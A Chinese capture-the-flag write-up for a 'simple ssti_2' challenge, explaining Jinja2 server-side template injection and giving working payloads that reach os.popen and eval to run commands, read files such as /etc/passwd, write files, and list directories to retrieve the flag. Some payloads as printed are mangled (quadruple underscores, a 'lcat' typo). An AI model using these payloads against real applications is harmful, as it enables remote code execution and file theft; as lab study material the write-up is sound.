### simple ssti_2

可以看见这个初始界面和上个题目一样，只是没有了注释提示

在ssti中，存在任意命令执行方法（因为在python系统里面，执行系统命令需要引入os模块，因此要在模板中直接调用内置模块，需要对其注册：global['os']=os）

python 3

    #命令执行：
    {% for c in [].__class__.__base__.__subclasses__() %}{% if c.__name__=='catch_warnings' %}{{ c.__init__.__globals__['__builtins__'].eval("__import__('os').popen('id').read()") }}{% endif %}{% endfor %}
    #文件操作
    {% for c in [].__class__.__base__.__subclasses__() %}{% if c.__name__=='catch_warnings' %}{{ c.__init__.__globals__['__builtins__'].open('filename', 'r').read() }}{% endif %}{% endfor %}

python 2 

    #文件路径设置同linux
    #读文件：
    {{ ''.__class__.__mro__[2].__subclasses__()[40]('/etc/passwd').read() }}
    #写文件：
    {{ ''.__class__.__mro__[2].__subclasses__()[40]('/tmp/1').write("") }}

因此在本题目中，可以构造playload：?flag={{ config.____class____.____init____.____globals____['os'].popen('ls ../').read() }}(双下划线)

即读取目录下所有文件

![image.png](https://i.loli.net/2021/07/12/Tcw6hE5AGv7izUx.png)

接下来一样的步骤，挨着看每个文件，

构造：?flag={{ config.____class____.____init____.____globals____['os'].popen('ls ../app').read() }}

![image.png](https://i.loli.net/2021/07/12/1VmbFNinzDkd6GR.png)

很幸运第一个里面就有flag文件，读取输出flag文件

构造：?flag={{ config.____class____.____init____.____globals____['os'].popen('lcat ../app/flag').read() }}

![image.png](https://i.loli.net/2021/07/12/r8wxuoCZ9V7TiWG.png)